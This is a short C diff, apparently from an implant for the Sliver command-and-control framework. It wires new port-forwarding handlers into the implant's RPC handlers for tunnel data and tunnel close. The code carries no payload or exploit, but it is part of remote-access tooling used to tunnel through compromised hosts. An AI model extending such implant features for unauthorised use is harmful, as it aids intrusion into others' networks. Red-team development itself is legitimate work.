@@ -269,6 +269,9 @@ int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *ou
   if (sliver_tunnel_data_decode(req->data, req->data_len, &td) != 0) {
     return -2;
   }
+  if (sliver_portfwd_tunnel_data(&td)) {
+    return -2;
+  }
   t = tunnel_find(td.tunnel_id);
   if (t == NULL) {
     return -2;
@@ -296,7 +299,9 @@ int sliver_rpc_handle_tunnel_close(const sliver_envelope_t *req, sliver_buf_t *o
   sliver_tunnel_data_t td;
   (void)out;
   if (sliver_tunnel_data_decode(req->data, req->data_len, &td) == 0) {
-    tunnel_release(tunnel_find(td.tunnel_id));
+    if (!sliver_portfwd_tunnel_close(td.tunnel_id)) {
+      tunnel_release(tunnel_find(td.tunnel_id));
+    }
   }
   return -2;
 }
@@ -306,6 +311,8 @@ int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *o
   (void)out;
   return -2; /* piped shells have no window size */
 }
+
+
 
 
 
